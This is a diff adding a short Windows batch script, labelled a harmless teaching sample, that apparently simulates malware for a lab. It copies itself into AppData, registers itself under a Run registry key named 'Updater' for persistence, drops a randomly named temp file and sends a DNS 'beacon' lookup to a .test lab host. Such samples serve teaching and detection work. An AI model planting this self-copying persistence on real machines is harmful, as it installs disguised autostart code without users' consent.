@@ -1,0 +1,6 @@
+@echo off
+REM updater_sim.bat - harmless teaching sample
+copy "%~f0" "%APPDATA%\updater.bat" >nul
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "%APPDATA%\updater.bat" /f
+echo beacon > "%TEMP%\cfg_%RANDOM%.dat"
+nslookup update.cis456-lab.test
